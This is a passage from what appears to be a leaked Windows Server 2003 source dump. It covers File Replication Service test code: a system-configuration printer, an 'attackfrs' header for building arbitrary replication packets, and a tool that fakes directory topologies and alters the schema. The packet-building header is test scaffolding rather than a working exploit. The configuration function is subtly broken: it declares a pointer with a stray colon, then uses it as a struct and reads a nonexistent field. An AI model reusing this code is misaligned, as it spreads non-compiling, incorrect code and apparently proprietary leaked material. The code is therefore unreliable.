        Sample->ServerWriteOperations[i] = SrvSampleStatistics.SrvWriteOperations[i];
        Sample->ServerBytesWritten[i]    = SrvSampleStatistics.SrvBytesWritten[i];

        Sample->ServerActiveThreads[i]   = (ULONGLONG) SrvSampleStatistics.SrvActiveThreads[i];
        Sample->ServerAvailableThreads[i]= (ULONGLONG) SrvSampleStatistics.SrvAvailableThreads[i];
        Sample->ServerFreeWorkItems[i]   = (ULONGLONG) SrvSampleStatistics.SrvFreeWorkItems[i];
        Sample->ServerStolenWorkItems[i] = (ULONGLONG) SrvSampleStatistics.SrvStolenWorkItems[i];
        Sample->ServerNeedWorkItem[i]    = (ULONGLONG) SrvSampleStatistics.SrvNeedWorkItem[i];
        Sample->ServerCurrentClients[i]  = (ULONGLONG) SrvSampleStatistics.SrvCurrentClients[i];

    }
    Sample->TimeStamp = LocalTimeOfDayInfo.CurrentTime.QuadPart;



void
ShowConfiguration(
    VOID
    )
{
    LPMEMORYSTATUSEX ms:
    CHAR    Buf[80];
    ULONG   szChar;
    ULONG   dWord;
    ULONG   sec, bytes, fclust, tclust;
    BYTE    major, minor;
    time_t  timet;
    SYSTEM_FLAGS_INFORMATION SystemFlags;
    SYSTEM_TIMEOFDAY_INFORMATION LocalTimeOfDayInfo;
    ULONG ReturnLocalTimeOfDayInfoLength;
    NTSTATUS Status;
    LONGLONG UpTime;
    CHAR    *architecture;
    CHAR    *processor;
    ULONG NumberProcessors;
    ULONG ProcessorSpeed;

    GetProcessorArchitecture(&processor,
                             &architecture,
                             &NumberProcessors,
                             &ProcessorSpeed);

    timet = time((time_t *)NULL);
    printf( "%s\n", ctime(&timet));

    //
    //      Get the machine name and output it:
    //
    szChar = sizeof(Buf);
    GetComputerName( Buf, &szChar );
    printf( "\nArchitecture: %s\nType: %s\nComputerName: %s\n",
           architecture, processor, Buf );
    printf( "Number of Processors: %lu\n", NumberProcessors );

    if (ProcessorSpeed != 0) {
        printf("Processor Speed (MHz)           %5.1f\n",
               (double)(ProcessorSpeed)/1.0E6);
    } else {
        printf("Processor Speed (MHz)     Not Available\n");
    }


    //
    //      Get the system version number:
    //
    dWord = GetVersion();
    major = (BYTE) dWord & 0xFF;
    minor = (BYTE) (dWord & 0xFF00) >> 8;
    printf( "Windows NT Version %d.%d (Build %lu)\n",
                                            major, minor, dWord >> 16 );

    //
    //      Get the system memory status:
    //
    printf( "\nMemory Status (MBYTES Avail/Total):\n" );
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    printf( "\t%-16s %3.1f/%3.1f\n",
                            "Physical Memory:",
                            (double)ms.ullAvailPhys/MBYTE,                            (double)ms.dwTotalPhys/MBYTE );
    printf( "\t%-16s %3.1f/%3.1f\n",
                            "Paging File:",
                            (double)ms.ullAvailPageFile/MBYTE,
                            (double)ms.ullTotalPageFile/MBYTE );


    //
    //      Get the disk space status:
    //
    GetDiskFreeSpace( NULL, &sec, &bytes, &fclust, &tclust );
    printf( "\t%-16s %3.1f/%3.1f\n",
                            "Disk Space",
                            ((double)sec*bytes*fclust)/MBYTE,
                            ((double)sec*bytes*tclust)/MBYTE );

    printf("\n\n");

    Status = NtQuerySystemInformation(
        SystemFlagsInformation,
        &SystemFlags,
        sizeof(SystemFlags),
        NULL);
    if (NT_SUCCESS(Status)) {
        printf("System Flags                    %08X\n", SystemFlags);
    } else {
        printf("System Flags              Not Available\n");
        DisplayNTStatus(Status);
    }


    NtQuerySystemInformation(
        SystemTimeOfDayInformation,
        &LocalTimeOfDayInfo,
        sizeof(LocalTimeOfDayInfo),
        &ReturnLocalTimeOfDayInfoLength);

    UpTime = (LocalTimeOfDayInfo.CurrentTime.QuadPart -
             LocalTimeOfDayInfo.BootTime.QuadPart) / (LONGLONG) 10000000;
    printf("System Up Time (hours)          %8.2f\n", (float)UpTime/3600.0);

#ifdef notinterested
    //
    //      Get the current pathname and filesystem type:
    //
    szChar = sizeof(Buf);
    GetCurrentDirectory(szChar, Buf );
    printf( "\nCurrent Directory: %s\n", Buf );
    printf( "TestDisk: %c%c,    ", Buf[0], Buf[1] );

    szChar = sizeof(Buf);
    GetVolumeInformation(NULL, NULL, (ULONG) NULL, NULL, NULL, NULL, Buf, szChar);
    printf( "Filesystem Type: %s\n", Buf );

    //
    //      Get the system pathname and filesystem type:
    //
    szChar = sizeof(Buf);
    GetSystemDirectory(Buf, szChar );
    printf( "SystemDisk: %c%c,  ", Buf[0], Buf[1] );

    szChar = sizeof(Buf);
    GetVolumeInformation(NULL, NULL, (ULONG) NULL, NULL, NULL, NULL, Buf, szChar);
    printf( "Filesystem Type: %s\n", Buf );

#endif

    printf("\n");
}




NTSTATUS
PrintPriority()
{
    THREAD_BASIC_INFORMATION ThreadBasicInfo;
    PROCESS_BASIC_INFORMATION ProcessBasicInfo;
    NTSTATUS Status;

    Status = NtQueryInformationThread(NtCurrentThread(),
                                      ThreadBasicInformation,
                                      &ThreadBasicInfo,
                                      sizeof(ThreadBasicInfo),
                                      NULL);
    if (!NT_SUCCESS(Status)) {
        printf("NtQueryInformationThread failed with Status %08x\n", Status);
        DisplayNTStatus(Status);
    }

    printf("Current thread priority is %d, affinity mask is %08x\n",
            ThreadBasicInfo.Priority,
            ThreadBasicInfo.AffinityMask);

    printf("Current thread base priority (really diff between thread prio and process base prio) is %d\n",
            ThreadBasicInfo.BasePriority);



    Status = NtQueryInformationProcess(NtCurrentProcess(),
                                      ProcessBasicInformation,
                                      &ProcessBasicInfo,
                                      sizeof(ProcessBasicInfo),
                                      NULL);
    if (!NT_SUCCESS(Status)) {
        printf("NtQueryInformationProcess failed with Status %08x\n", Status);
        DisplayNTStatus(Status);
        return (Status);
    }
    printf("Current process base priority is %d, affinity mask is %08x\n",
            ProcessBasicInfo.BasePriority,
            ProcessBasicInfo.AffinityMask);


    return (STATUS_SUCCESS);
}

#endif

#if 0

//
// Add the following test -
// Get the vol info when the volume root is opened in JrnlOpen() and save
// it in the Vme struct.  Each time we init a replica set and open the replica root
// dir for the first time, get the vol info again using the replica root and
// verify that the replica root is on the actual volume.  This handles the
// case where one of the dirs in the replica root is actually a junction
// point which would take us to a different volume.
//

// try GetVolumeNameForVolumeMountPoint()

Status = NtQueryVolumeInformationFile(
            Handle,
            &IoStatusBlock,
            VolumeInfo,
            VolumeInfoLength,
            FileFsVolumeInformation
            );

typedef struct _FILE_FS_VOLUME_INFORMATION {
    LARGE_INTEGER VolumeCreationTime;
    ULONG VolumeSerialNumber;
    ULONG VolumeLabelLength;
    BOOLEAN SupportsObjects;
    WCHAR VolumeLabel[1];
} FILE_FS_VOLUME_INFORMATION, *PFILE_FS_VOLUME_INFORMATION;

#endif
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\attackfrs\attack.h ===
#define FREE(x) {if(x) {free(x);}}

VOID*
MALLOC(size_t x);


//
// Types for the common comm subsystem
//
// WARNING: The order of these entries can never change.  This ensures that
// packets can be exchanged between uplevel and downlevel members.
//
typedef enum _COMMTYPE {
    COMM_NONE = 0,

    COMM_BOP,               // beginning of packet

    COMM_COMMAND,           // command packet stuff
    COMM_TO,
    COMM_FROM,
    COMM_REPLICA,
    COMM_JOIN_GUID,
    COMM_VVECTOR,
    COMM_CXTION,

    COMM_BLOCK,             // file data
    COMM_BLOCK_SIZE,
    COMM_FILE_SIZE,
    COMM_FILE_OFFSET,

    COMM_REMOTE_CO,         // remote change order command

    COMM_GVSN,              // version (guid, vsn)

    COMM_CO_GUID,           // change order guid

    COMM_CO_SEQUENCE_NUMBER,// CO Seq number for ack.

    COMM_JOIN_TIME,         // machine's can't join if there times or badly out of sync

    COMM_LAST_JOIN_TIME,    // The Last time this connection was joined.
                            // Used to detect Database mismatch.

    COMM_EOP,               // end of packet

    COMM_REPLICA_VERSION_GUID, // replica version guid (originator guid)

    COMM_MD5_DIGEST,        // md5 digest
    //
    // Change Order Record Extension.  If not supplied the the ptr for
    // what was Spare1Bin (now Extension) is left as Null.  So comm packets
    // sent from down level members still work.
    //
    COMM_CO_EXT_WIN2K,      // in down level code this was called COMM_CO_EXTENSION.
    //
    // See comment in schema.h for why we need to seperate the var len
    // COMM_CO_EXTENSION_2 from COMM_CO_EXT_WIN2K above.
    //
    COMM_CO_EXTENSION_2,

    COMM_COMPRESSION_GUID,  // Guid for a supported compression algorithm.
    //
    // WARNING: To ensure that down level members can read Comm packets
    // from uplevel clients always add net data type codes here.
    //
    COMM_MAX
} COMM_TYPE, *PCOMM_TYPE;
#define COMM_NULL_DATA  (-1)

//
// The decode data types are defined below.  They are used in the CommPacketTable
// to aid in decode dispatching and comm packet construction
// They DO NOT get sent in the actual packet.
//
typedef enum _COMM_PACKET_DECODE_TYPE {
    COMM_DECODE_NONE = 0,
    COMM_DECODE_ULONG,
    COMM_DECODE_ULONG_TO_USHORT,
    COMM_DECODE_GNAME,
    COMM_DECODE_BLOB,
    COMM_DECODE_ULONGLONG,
    COMM_DECODE_VVECTOR,
    COMM_DECODE_VAR_LEN_BLOB,
    COMM_DECODE_REMOTE_CO,
    COMM_DECODE_GUID,
    COMM_DECODE_MAX
} COMM_PACKET_DECODE_TYPE, *PCOMM_PACKET_DECODE_TYPE;

//
// The COMM_PACKET_ELEMENT struct is used in a table to describe the data
// elements in a Comm packet.
//
typedef struct _COMM_PACKET_ELEMENT_ {
    COMM_TYPE    CommType;
    PCHAR        CommTag;
    ULONG        DataSize;
    ULONG        DecodeType;
    ULONG        NativeOffset;
} COMM_PACKET_ELEMENT, *PCOMM_PACKET_ELEMENT;



#define COMM_MEM_SIZE               (128)

//
// Size of the required Beginning-of-packet and End-of-Packet fields
//
#define MIN_COMM_PACKET_SIZE    (2 * (sizeof(USHORT) + sizeof(ULONG) + sizeof(ULONG)))

#define  COMM_SZ_UL        sizeof(ULONG)
#define  COMM_SZ_ULL       sizeof(ULONGLONG)
#define  COMM_SZ_GUID      sizeof(GUID)
#define  COMM_SZ_GUL       sizeof(GUID) + sizeof(ULONG)
#define  COMM_SZ_GVSN      sizeof(GVSN) + sizeof(ULONG)
#define  COMM_SZ_NULL      0
#define  COMM_SZ_COC       sizeof(CHANGE_ORDER_COMMAND) + sizeof(ULONG)
//#define  COMM_SZ_COC       CO_PART1_SIZE + CO_PART2_SIZE + CO_PART3_SIZE + sizeof(ULONG)
#define  COMM_SZ_COEXT_W2K sizeof(CO_RECORD_EXTENSION_WIN2K) + sizeof(ULONG)
#define  COMM_SZ_MD5       MD5DIGESTLEN + sizeof(ULONG)
#define  COMM_SZ_JTIME     sizeof(ULONGLONG) + sizeof(ULONG)

PCOMM_PACKET
CommStartCommPkt(
    IN PWCHAR       Name
    );


VOID
CommPackULong(
    IN PCOMM_PACKET CommPkt,
    IN COMM_TYPE    Type,
    IN ULONG        Data
    );

// 
// Use a list of COMM_PKT_DESCRIPTOR items to build an
// arbitrary COMM_PACKET via BuildCommPktFromDescriptorList
//

typedef struct _CommPktDescriptor {
    struct _CommPktDescriptor *Next; // for linking together the items.
    USHORT CommType;  // We might want to use an undefined type, so don't limit to COMM_TYPE
    ULONG  CommDataLength; // The length to put in the CommPkt
    ULONG  ActualDataLength; // The real length of Data
    PVOID  Data; // the data
} COMM_PKT_DESCRIPTOR, *PCOMM_PKT_DESCRIPTOR;


PCOMM_PACKET
BuildCommPktFromDescriptorList(
    IN PCOMM_PKT_DESCRIPTOR pListHead,
    IN ULONG ActualPktSize,
    IN OPTIONAL ULONG *Major,
    IN OPTIONAL ULONG *Minor,
    IN OPTIONAL ULONG *CsId,
    IN OPTIONAL ULONG *MemLen,
    IN OPTIONAL ULONG *PktLen,
    IN OPTIONAL ULONG *UpkLen
    );


#define COPY_GUID(_a_, _b_)    CopyGuid((GUID UNALIGNED *)(_a_), (GUID UNALIGNED *)(_b_))
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\dstree\dstree.cxx ===
/*++

Copyright (c) 1997-1999 Microsoft Corporation

Module Name:
    dstree.cxx

Abstract:
    This module is a development tool. It creates dummy entries in the DS.
    The file replication service treats the dummy entries as a topology.
    Without this tool, creating interesting topologies would require many
    more machines than I have on hand.

    The command is run as, "dstree <command-file". command-file is a list
    of command lines and comment lines.

    Command lines are read from standard in, parsed, and then shipped
    off to the command subroutines. The command line syntax is:
        command,site,settings,server,connection,fromserver
    "command" is any of add|delete|list|show|quit. Leading whitespace is
    ignored. Whitespace between commas counts. The comma separated strings
    following "command" are optional. The command line can stop anytime
    after "command" and the command will on be applied to that portion
    of the "Distinquished Name".

    Comment lines are empty lines or lines that begin with /, #, or !.
    The files dstree.add and dstree.del are command files. They create
    and delete a bogus topology.

Author:
    Billy J. Fuller 3-Mar-1997 (From Jim McNelis)

Environment
    User mode winnt

--*/
#include <ntreppch.h>
#pragma  hdrstop
#include <frs.h>
#include <lmcons.h>
#include <lmapibuf.h>
#include <winsock2.h>
#include <ntdsapi.h>

#define FREE(_x_)   { if (_x_) free(_x_); _x_ = NULL; }


//
// Some useful DS object classes and object attributes
// that are not included in frs.h
//
#define CN_TEST_SETTINGS            L"NTFRS Test Settings"
#define ATTR_SYSTEM_FLAGS           L"systemFlags"
#define ATTR_SYSTEM_MAY_CONTAIN     L"systemMayContain"
#define ATTR_SYSTEM_MUST_CONTAIN    L"systemMustContain"
#define ATTR_SYSTEM_POSS_SUPERIORS  L"systemPossSuperiors"
#define SCHEMA_NAMING_CONTEXT       L"cn=schema"
#define ATTR_TRUE                   L"TRUE"
#define ATTR_OPTIONS_0              L"0"

//
// For DumpValues
//
PWCHAR   GuidAttrs[] = {
    L"objectGUID",
    L"schemaIDGUID",
    L"frsVersionGUID",
    NULL
};

PWCHAR   BerAttrs[] = {
    L"replPropertyMetaData",
    L"invocationId",
    L"defaultSecurityDescriptor",
    L"objectSid",
    L"lmPwdHistory",
    L"ntPwdHistory",
    L"oMObjectClass",
    NULL
};

//
// For HammerSchema
//
struct AlterAttr {
    PWCHAR  Attr;
    PWCHAR  Value;
};
struct AlterClass {
    PWCHAR  Cn;
    struct  AlterAttr    AlterAttrs[32];
};

struct AlterClass Computer = {
    L"Computer",
    L"mayContain",      L"frsComputerReferenceBL",
    NULL, NULL
};

struct AlterClass NtFrsSettings = {
    L"NTFRS-Settings",
    L"possSuperiors",   L"container",
    L"possSuperiors",   L"organization",
    L"possSuperiors",   L"organizationalUnit",
    L"mayContain",      L"managedBy",
    L"mayContain",      L"frsExtensions",
    NULL, NULL
};

struct AlterClass NtFrsReplicaSet = {
    L"NTFRS-Replica-Set",
    L"mayContain",  L"frsVersionGuid",
    L"mayContain",  L"FrsReplicaSetGuid",
    L"mayContain",  L"frsPrimaryMember",
    L"mayContain",  L"managedBy",
    L"mayContain",  L"frsReplicaSetType",
    L"mayContain",  L"frsDirectoryFilter",
    L"mayContain",  L"frsDSPoll",
    L"mayContain",  L"frsExtensions",
    L"mayContain",  L"frsFileFilter",
    L"mayContain",  L"frsFlags",
    L"mayContain",  L"frsLevelLimit",
    L"mayContain",  L"frsPartnerAuthLevel",
    L"mayContain",  L"frsRootSecurity",
    L"mayContain",  L"frsServiceCommand",
    NULL, NULL
};

struct AlterClass NtDsConnection = {
    L"NTDS-Connection",
    L"possSuperiors", L"nTFRSMember",
    NULL, NULL
};

struct AlterClass Dump = {
    L"Server-Reference",
    L"systemFlags", L"",
    NULL, NULL
};

//
// ATTRIBUTES
//

struct AlterClass FrsExtensions = {
    L"Frs-Extensions",
    L"cn",                  L"Frs-Extensions",
    L"adminDisplayName",    L"Frs-Extensions",
    L"adminDescription",    L"Frs-Extensions",
    L"lDAPDisplayName",     L"frsExtensions",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7000.82",
    L"oMSyntax",            L"4",
    L"attributeSyntax",     L"2.5.5.10",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"rangeLower",          L"1",
    L"rangeUpper",          L"65536",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsVersionGuid = {
    L"Frs-Version-GUID",
    L"cn",                  L"Frs-Version-GUID",
    L"adminDisplayName",    L"Frs-Version-GUID",
    L"adminDescription",    L"Frs-Version-GUID",
    L"lDAPDisplayName",     L"frsVersionGUID",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7000.83",
    L"oMSyntax",            L"4",
    L"attributeSyntax",     L"2.5.5.10",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsReplicaSetGuid = {
    L"Frs-Replica-Set-GUID",
    L"cn",                  L"Frs-Replica-Set-GUID",
    L"adminDisplayName",    L"Frs-Replica-Set-GUID",
    L"adminDescription",    L"Frs-Replica-Set-GUID",
    L"lDAPDisplayName",     L"frsReplicaSetGUID",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7000.84",
    L"oMSyntax",            L"4",
    L"attributeSyntax",     L"2.5.5.10",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"rangeLower",          L"16",
    L"rangeUpper",          L"16",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsDsPoll = {
    L"Frs-DS-Poll",
    L"cn",                  L"Frs-DS-Poll",
    L"adminDisplayName",    L"Frs-DS-Poll",
    L"adminDescription",    L"Frs-DS-Poll",
    L"lDAPDisplayName",     L"frsDSPoll",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7000.85",
    L"oMSyntax",            L"2",
    L"attributeSyntax",     L"2.5.5.9",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

//
// replica set types
//
struct AlterClass FrsReplicaSetType = {
    L"Frs-Replica-Set-Type",
    L"cn",                  L"Frs-Replica-Set-Type",
    L"adminDisplayName",    L"Frs-Replica-Set-Type",
    L"adminDescription",    L"Frs-Replica-Set-Type",
    L"lDAPDisplayName",     L"frsReplicaSetType",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7000.86",
    L"oMSyntax",            L"2",
    L"attributeSyntax",     L"2.5.5.9",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsDirectoryFilter = {
    L"Frs-Directory-Filter",
    L"cn",                  L"Frs-Directory-Filter",
    L"adminDisplayName",    L"Frs-Directory-Filter",
    L"adminDescription",    L"bjf l;kjlkj xyz",
    L"lDAPDisplayName",     L"frsDirectoryFilter",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7000.87",
    L"oMSyntax",            L"64",
    L"attributeSyntax",     L"2.5.5.12",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"rangeLower",          L"1",
    L"rangeUpper",          L"1024",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

//
// OIDs out of sequence
//
struct AlterClass FrsControlDataCreation = {
    L"Frs-Control-Data-Creation",
    L"cn",                  L"Frs-Control-Data-Creation",
    L"adminDisplayName",    L"Frs-Control-Data-Creation",
    L"adminDescription",    L"bob",
    L"lDAPDisplayName",     L"frsControlDataCreation",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7002.00",
    L"oMSyntax",            L"64",
    L"attributeSyntax",     L"2.5.5.12",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"rangeLower",          L"0",
    L"rangeUpper",          L"32",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsControlInboundBacklog = {
    L"Frs-Control-Inbound-Backlog",
    L"cn",                  L"Frs-Control-Inbound-Backlog",
    L"adminDisplayName",    L"Frs-Control-Inbound-Backlog",
    L"adminDescription",    L"george",
    L"lDAPDisplayName",     L"frsControlInboundBacklog",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7002.01",
    L"oMSyntax",            L"64",
    L"attributeSyntax",     L"2.5.5.12",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"rangeLower",          L"0",
    L"rangeUpper",          L"32",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsControlOutboundBacklog = {
    L"Frs-Control-Outbound-Backlog",
    L"cn",                  L"Frs-Control-Outbound-Backlog",
    L"adminDisplayName",    L"Frs-Control-Outbound-Backlog",
    L"adminDescription",    L"Frs-Control-Outbound-Backlog",
    L"lDAPDisplayName",     L"frsControlOutboundBacklog",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7002.02",
    L"oMSyntax",            L"64",
    L"attributeSyntax",     L"2.5.5.12",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"rangeLower",          L"0",
    L"rangeUpper",          L"32",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsFaultCondition = {
    L"Frs-Fault-Condition",
    L"cn",                  L"Frs-Fault-Condition",
    L"adminDisplayName",    L"Frs-Fault-Condition",
    L"adminDescription",    L"Frs-Fault-Condition",
    L"lDAPDisplayName",     L"frsFaultCondition",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7002.03",
    L"oMSyntax",            L"64",
    L"attributeSyntax",     L"2.5.5.12",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"rangeLower",          L"1",
    L"rangeUpper",          L"16",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsVersion = {
    L"Frs-Version",
    L"cn",                  L"Frs-Version",
    L"adminDisplayName",    L"Frs-Version",
    L"adminDescription",    L"Frs-Version",
    L"lDAPDisplayName",     L"frsVersion",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7002.04",
    L"oMSyntax",            L"64",
    L"attributeSyntax",     L"2.5.5.12",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"rangeLower",          L"0",
    L"rangeUpper",          L"32",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsPrimaryMember = {
    L"Frs-Primary-Member",
    L"cn",                  L"Frs-Primary-Member",
    L"adminDisplayName",    L"Frs-Primary-Member",
    L"adminDescription",    L"Frs-Primary-Member",
    L"lDAPDisplayName",     L"frsPrimaryMember",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7002.05",
    L"oMSyntax",            L"127",
    L"attributeSyntax",     L"2.5.5.1",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"systemFlags",         L"2",
    L"linkID",              L"104",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};
//
// END OIDs out of sequence
//

struct AlterClass FrsFileFilter = {
    L"Frs-File-Filter",
    L"cn",                  L"Frs-File-Filter",
    L"adminDisplayName",    L"Frs-File-Filter",
    L"adminDescription",    L"sue and and and",
    L"lDAPDisplayName",     L"frsFileFilter",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7000.88",
    L"oMSyntax",            L"64",
    L"attributeSyntax",     L"2.5.5.12",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"rangeLower",          L"1",
    L"rangeUpper",          L"1024",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsFlags = {
    L"Frs-Flags",
    L"cn",                  L"Frs-Flags",
    L"adminDisplayName",    L"Frs-Flags",
    L"adminDescription",    L"Frs-Flags",
    L"lDAPDisplayName",     L"frsFlags",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7000.89",
    L"oMSyntax",            L"2",
    L"attributeSyntax",     L"2.5.5.9",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsLevelLimit = {
    L"Frs-Level-Limit",
    L"cn",                  L"Frs-Level-Limit",
    L"adminDisplayName",    L"Frs-Level-Limit",
    L"adminDescription",    L"Frs-Level-Limit",
    L"lDAPDisplayName",     L"frsLevelLimit",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7000.90",
    L"oMSyntax",            L"2",
    L"attributeSyntax",     L"2.5.5.9",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsPartnerAuthLevel = {
    L"Frs-Partner-Auth-Level",
    L"cn",                  L"Frs-Partner-Auth-Level",
    L"adminDisplayName",    L"Frs-Partner-Auth-Level",
    L"adminDescription",    L"Frs-Partner-Auth-Level",
    L"lDAPDisplayName",     L"frsPartnerAuthLevel",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7000.91",
    L"oMSyntax",            L"2",
    L"attributeSyntax",     L"2.5.5.9",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsRootSecurity = {
    L"Frs-Root-Security",
    L"cn",                  L"Frs-Root-Security",
    L"adminDisplayName",    L"Frs-Root-Security",
    L"adminDescription",    L"Frs-Root-Security",
    L"lDAPDisplayName",     L"frsRootSecurity",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7000.92",
    L"oMSyntax",            L"66",
    L"attributeSyntax",     L"2.5.5.15",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsServiceCommand = {
    L"Frs-Service-Command",
    L"cn",                  L"Frs-Service-Command",
    L"adminDisplayName",    L"Frs-Service-Command",
    L"adminDescription",    L"Frs-Service-Command",
    L"lDAPDisplayName",     L"frsServiceCommand",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7000.93",
    L"oMSyntax",            L"64",
    L"attributeSyntax",     L"2.5.5.12",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"rangeLower",          L"0",
    L"rangeUpper",          L"512",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsUpdateTimeout = {
    L"Frs-Update-Timeout",
    L"cn",                  L"Frs-Update-Timeout",
    L"adminDisplayName",    L"Frs-Update-Timeout",
    L"adminDescription",    L"Frs-Update-Timeout",
    L"lDAPDisplayName",     L"frsUpdateTimeout",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7000.94",
    L"oMSyntax",            L"2",
    L"attributeSyntax",     L"2.5.5.9",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsWorkingPath = {
    L"Frs-Working-Path",
    L"cn",                  L"Frs-Working-Path",
    L"adminDisplayName",    L"Frs-Working-Path",
    L"adminDescription",    L"Frs-Working-Path",
    L"lDAPDisplayName",     L"frsWorkingPath",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7000.95",
    L"oMSyntax",            L"64",
    L"attributeSyntax",     L"2.5.5.12",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"rangeLower",          L"0",
    L"rangeUpper",          L"512",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsStagingPath = {
    L"Frs-Staging-Path",
    L"cn",                  L"Frs-Staging-Path",
    L"adminDisplayName",    L"Frs-Staging-Path",
    L"adminDescription",    L"Frs-Staging-Path",
    L"lDAPDisplayName",     L"frsStagingPath",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7000.96",
    L"oMSyntax",            L"64",
    L"attributeSyntax",     L"2.5.5.12",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"rangeLower",          L"0",
    L"rangeUpper",          L"512",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsServiceCommandStatus = {
    L"Frs-Service-Command-Status",
    L"cn",                  L"Frs-Service-Command-Status",
    L"adminDisplayName",    L"Frs-Service-Command-Status",
    L"adminDescription",    L"frsServiceCommandStatus",
    L"lDAPDisplayName",     L"frsServiceCommandStatus",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7000.98",
    L"oMSyntax",            L"64",
    L"attributeSyntax",     L"2.5.5.12",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"rangeLower",          L"0",
    L"rangeUpper",          L"512",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsTimeLastCommand = {
    L"Frs-Time-Last-Command",
    L"cn",                  L"Frs-Time-Last-Command",
    L"adminDisplayName",    L"Frs-Time-Last-Command",
    L"adminDescription",    L"Frs-Time-Last-Command",
    L"lDAPDisplayName",     L"frsTimeLastCommand",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7000.99",
    L"oMSyntax",            L"23",
    L"attributeSyntax",     L"2.5.5.11",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsTimeLastConfigChange = {
    L"Frs-Time-Last-Config-Change",
